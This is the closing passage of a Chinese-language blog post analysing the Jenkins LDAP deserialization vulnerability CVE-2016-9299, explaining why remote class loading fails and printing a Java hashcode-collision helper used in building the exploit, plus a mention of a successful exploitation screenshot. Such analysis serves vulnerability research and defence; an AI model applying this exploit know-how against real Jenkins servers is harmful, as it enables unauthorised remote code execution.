Exception </span>&#123;</span><br><span class="line">		socketServer();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后再来简单说下那个Obj.decodeObject(attrs)的Payload构造问题，有的同学肯定会说了jndi不是直接可以远程加载类然后实例化么，这个问题再上门说过了，对于LDAP的jndi这个方法是行不通的，我们来看看这个Obj类到底是怎么处理的</p>
<p><div align="center"><br><img src="/attach/obj.decodeObject.png" alt="/attach/obj.decodeObject.png"><br></div><br>这里我们可以看到这里定义多种不同的方式来去解析对象， ClassLoader cl = helper.getURLClassLoader(codebases); 这个类加载器是从codebase的URL中去加载涉及的相关类，但是我看下具体方法</p>
<p><div align="center"><br><img src="/attach/urlcodebase.png" alt="/attach/urlcodebase.png"><br></div><br>所以默认是加载不了codebase中定义的类的，一旦这样我们就只能构造相关反序列化漏洞的POC，让类在Jenkins进行反序列化时再触发漏洞了，不过这样子的话Payload很有可能不成功。</p>
<h2 id="关于hashcode的碰撞问题"><a href="#关于hashcode的碰撞问题" class="headerlink" title="关于hashcode的碰撞问题"></a>关于hashcode的碰撞问题</h2><p>这样叫不知道对不对，姑且这样叫吧，老外早就研究过这个问题，我直接把代码丢出来，可以碰撞出任意数值的hashcode值，大家在使用的时候要注意版权问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> iswin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCollision</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">convert</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		str = (str == <span class="keyword">null</span> ? <span class="string">""</span> : str);</span><br><span class="line">		String tmp;</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="number">1000</span>);</span><br><span class="line">		<span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">int</span> i, j;</span><br><span class="line">		sb.setLength(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">			c = str.charAt(i);</span><br><span class="line">			sb.append(<span class="string">"\\u"</span>);</span><br><span class="line">			j = (c &gt;&gt;&gt; <span class="number">8</span>); <span class="comment">// 取出高8位</span></span><br><span class="line">			tmp = Integer.toHexString(j);</span><br><span class="line">			<span class="keyword">if</span> (tmp.length() == <span class="number">1</span>)</span><br><span class="line">				sb.append(<span class="string">"0"</span>);</span><br><span class="line">			sb.append(tmp);</span><br><span class="line">			j = (c &amp; <span class="number">0xFF</span>); <span class="comment">// 取出低8位</span></span><br><span class="line">			tmp = Integer.toHexString(j);</span><br><span class="line">			<span class="keyword">if</span> (tmp.length() == <span class="number">1</span>)</span><br><span class="line">				sb.append(<span class="string">"0"</span>);</span><br><span class="line">			sb.append(tmp);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">new</span> String(sb));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">string2Unicode</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">		StringBuffer unicode = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; string.length(); i++) &#123;</span><br><span class="line">			<span class="comment">// 取出每一个字符</span></span><br><span class="line">			<span class="keyword">char</span> c = string.charAt(i);</span><br><span class="line">			<span class="comment">// 转换为unicode</span></span><br><span class="line">			unicode.append(<span class="string">"\\u"</span> + Integer.toHexString(c));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> unicode.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Returns a string with a hash equal to the argument.</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string with a hash equal to the argument.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@author</span> - Joseph Darcy</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">unhash</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">		StringBuilder answer = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">if</span> (target &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span></span><br><span class="line">			answer.append(<span class="string">"\u0915\u0009\u001e\u000c\u0002"</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (target == Integer.MIN_VALUE)</span><br><span class="line">				<span class="keyword">return</span> answer.toString();</span><br><span class="line">			<span class="comment">// Find target without sign bit set</span></span><br><span class="line">			target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		unhash0(answer, target);</span><br><span class="line">		<span class="keyword">return</span> answer.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@author</span> - Joseph Darcy</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unhash0</span><span class="params">(StringBuilder partial, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> div = target / <span class="number">31</span>;</span><br><span class="line">		<span class="keyword">int</span> rem = target % <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (div &lt;= Character.MAX_VALUE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (div != <span class="number">0</span>)</span><br><span class="line">				partial.append((<span class="keyword">char</span>) div);</span><br><span class="line">			partial.append((<span class="keyword">char</span>) rem);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			unhash0(partial, div);</span><br><span class="line">			partial.append((<span class="keyword">char</span>) rem);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		System.out.println(convert(unhash(<span class="number">877174790</span>)));</span><br><span class="line">		System.out.println(<span class="string">"\u0915\u0009\u001e\u000c\u0002\u5569\u001b\u0006\u001b"</span>.hashCode());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>补一张成功利用的截图</p>
<p><div align="center"><br><img src="/attach/jenkins-exploit.jpg" alt="/attach/jenkins-exploit.jpg"><br></div></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>只要方向对，撸起袖子加油干！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://github.com/rapid7/metasploit-framework/pull/7815" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/7815</a></p>
<p>注：转载请保留版权。</p>
  
	</div>
		<footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/JAVA/">JAVA</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/Deserialize/">Deserialize</a><a href="/tags/JAVA/">JAVA</a>
  </div>

</div>



	<div class="article-share" id="share">
	
	  <div data-url="https://www.iswin.org/2017/01/25/Jenkins-LDAP-Deserializable-Vulnerablity-CVE-2016-9299-Analysis/" data-title="Jenkins-LDAP (CVE-2016-9299) 反序列化漏洞分析 | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
	  </div>
	
	</div>


</footer>

   	       
	</article>
	
<nav class="article-nav clearfix">
 
 <div class="prev" >
 <a href="/2017/06/11/CVE-2017-4971-Spring-WebFlow-RCE-Analysis/" title="Spring WebFlow 远程代码执行漏洞分析(CVE-2017-4971)">
  <strong>上一篇：</strong><br/>
  <span>
  Spring WebFlow 远程代码执行漏洞分析(CVE-2017-4971)</span>
</a>
</div>


<div class="next">
<a href="/2016/10/15/Simple-CAPTCHA-Recognition-with-Machine-Learning/"  title="机器学习之识别简单验证码">
 <strong>下一篇：</strong><br/> 
 <span>机器学习之识别简单验证码
</span>
</a>
</div>

</nav>

	

</div>  
      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>

  <div id="toc" class="toc-aside">
  <strong class="toc-title">文章目录</strong>
 
 <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-LDAP-JNDI"><span class="toc-number">3.</span> <span class="toc-text">Payload-LDAP-JNDI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload-LDAP-SERVER"><span class="toc-number">4.</span> <span class="toc-text">Payload-LDAP-SERVER</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于hashcode的碰撞问题"><span class="toc-number">5.</span> <span class="toc-text">关于hashcode的碰撞问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
 
  </div>

<div id="asidepart">
<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
<aside class="clearfix">

  
<div class="categorieslist">
	<p class="asidetitle">分类</p>
		<ul>
		
		  
			<li><a href="/categories/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
		  
		
		  
			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Python/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Python/" title="Python">Python<sup>3</sup></a></li>
		  
		
		  
			<li><a href="/categories/Spring/" title="Spring">Spring<sup>1</sup></a></li>
		  
		
		  
			<li><a href="/categories/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
		  
		
		</ul>
</div>


  
<div class="tagslist">
	<p class="asidetitle">标签</p>
		<ul class="clearfix">
		
			
				<li><a href="/tags/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
			
		
			
				<li><a href="/tags/Deserialize/" title="Deserialize">Deserialize<sup>5</sup></a></li>
			
		
			
				<li><a href="/tags/Python/" title="Python">Python<sup>2</sup></a></li>
			
		
			
				<li><a href="/tags/Spring/" title="Spring">Spring<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/RCE/" title="RCE">RCE<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Scikit-Learn/" title="Scikit-Learn">Scikit-Learn<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Pybrain/" title="Pybrain">Pybrain<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Cdlinux/" title="Cdlinux">Cdlinux<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
			
		
			
				<li><a href="/tags/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
			
		
		</ul>
</div>


  <div class="linkslist">
  <p class="asidetitle">友情链接</p>
    <ul>
        
          <li>
            
            	<a href="http://p2j.cn" target="_blank" title="园长博客">园长博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.shack2.org" target="_blank" title="Shack2博客">Shack2博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.cnseay.com" target="_blank" title="Seay博客">Seay博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.z7ys.com" target="_blank" title="z7y博客">z7y博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://bluereader.org" target="_blank" title="深蓝阅读">深蓝阅读</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.untnt.com" target="_blank" title="TNT博客">TNT博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.03sec.com/" target="_blank" title="Sky博客">Sky博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.jxcm.net/" target="_blank" title="DCC博客">DCC博客</a>
            
          </li>
        
          <li>
            
            	<a href="http://cnbraid.com" target="_blank" title="Braid&#39;s Blog">Braid&#39;s Blog</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.xiyv.net" target="_blank" title="wolf&#39;s blog">wolf&#39;s blog</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.blackh4t.org" target="_blank" title="DarkRay&#39;s BLoG">DarkRay&#39;s BLoG</a>
            
          </li>
        
          <li>
            
            	<a href="http://www.00theway.org" target="_blank" title="00theway&#39;s Blog">00theway&#39;s Blog</a>
            
          </li>
        
          <li>
            
            	<a href="https://bksec.net/" target="_blank" title="my5t3ry&#39;s Blog">my5t3ry&#39;s Blog</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.00day.com/" target="_blank" title="Luoye&#39;s blog">Luoye&#39;s blog</a>
            
          </li>
        
          <li>
            
            	<a href="https://www.imbeee.com" target="_blank" title="Beeeの零碎事">Beeeの零碎事</a>
            
          </li>
        
    </ul>
</div>

  


  <div class="rsspart">
	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
</div>

</aside>
</div>
    </div>
    <footer><div id="footer" >
	
	<div class="line">
		<span></span>
		<div class="author"></div>
	</div>
	
	
	<section class="info">
		<p> 当才华还撑不起野心时，那就应该静下心来学习。 <br/>
			当能力还驾奴不了目标时，就应该沉下心来历练。</p>
	</section>
	 
	<div class="social-font" class="clearfix">
		
		
		
		
		
		
		
		
		
		
	</div>
			
		

		<p class="copyright">
		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
		Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
		
		<a href="/about" target="_blank" title="iswin">iswin</a>
		
		
		</p>
</div>
</footer>
    <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>

<script type="text/javascript">
$(document).ready(function(){ 
  $('.navbar').click(function(){
    $('header nav').toggleClass('shownav');
  });
  var myWidth = 0;
  function getSize(){
    if( typeof( window.innerWidth ) == 'number' ) {
      myWidth = window.innerWidth;
    } else if( document.documentElement && document.documentElement.clientWidth) {
      myWidth = document.documentElement.clientWidth;
    };
  };
  var m = $('#main'),
      a = $('#asidepart'),
      c = $('.closeaside'),
      o = $('.openaside');
  c.click(function(){
    a.addClass('fadeOut').css('display', 'none');
    o.css('display', 'block').addClass('fadeIn');
    m.addClass('moveMain');
  });
  o.click(function(){
    o.css('display', 'none').removeClass('beforeFadeIn');
    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
    m.removeClass('moveMain');
  });
  $(window).scroll(function(){
    o.css("top",Math.max(80,260-$(this).scrollTop()));
  });
  
  $(window).resize(function(){
    getSize(); 
    if (myWidth >= 1024) {
      $('header nav').removeClass('shownav');
    }else{
      m.removeClass('moveMain');
      a.css('display', 'block').removeClass('fadeOut');
      o.css('display', 'none');
      
      $('#toc.toc-aside').css('display', 'none');
        
    }
  });
});
</script>

<script type="text/javascript">
$(document).ready(function(){ 
  var ai = $('.article-content>iframe'),
      ae = $('.article-content>embed'),
      t  = $('#toc'),
      ta = $('#toc.toc-aside'),
      o  = $('.openaside'),
      c  = $('.closeaside');
  if(ai.length>0){
    ai.wrap('<div class="video-container" />');
  };
  if(ae.length>0){
   ae.wrap('<div class="video-container" />');
  };
  c.click(function(){
    ta.css('display', 'block').addClass('fadeIn');
  });
  o.click(function(){
    ta.css('display', 'none');
  });
  $(window).scroll(function(){
    ta.css("top",Math.max(140,320-$(this).scrollTop()));
  });
});
</script>


<script type="text/javascript">
$(document).ready(function(){ 
  var $this = $('.share'),
      url = $this.attr('data-url'),
      encodedUrl = encodeURIComponent(url),
      title = $this.attr('data-title'),
      tsina = $this.attr('data-tsina'),
      description = $this.attr('description');
  var html = [
  '<a href="#" class="overlay" id="qrcode"></a>',
  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
  '<span title="Share to"></span>'
  ].join('');
  $this.append(html);
  $('.article-share-qrcode').click(function(){
    var imgSrc = $('#qrcode-pic').attr('data-src');
    $('#qrcode-pic').attr('src', imgSrc);
    $('#qrcode-pic').load(function(){
        $('.qrcode strong').text(' ');
    });
  });
});     
</script>









<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$(document).ready(function(){ 
  $('.article-content').each(function(i){
    $(this).find('img').each(function(){
      if ($(this).parent().hasClass('fancybox')) return;
      var alt = this.alt;
      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
    });
    $(this).find('.fancybox').each(function(){
      $(this).attr('rel', 'article' + i);
    });
  });
  if($.fancybox){
    $('.fancybox').fancybox();
  }
}); 
</script>



<!-- Analytics Begin -->





<!-- Analytics End -->

<!-- Totop Begin -->

	<div id="totop">
	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
	</div>
	<script src="/js/totop.js"></script>

<!-- Totop End -->

<!-- MathJax Begin -->
<!-- mathjax config similar to math.stackexchange -->


<!-- MathJax End -->

<!-- Tiny_search Begin -->

<!-- Tiny_search End -->

  </body>
</html>
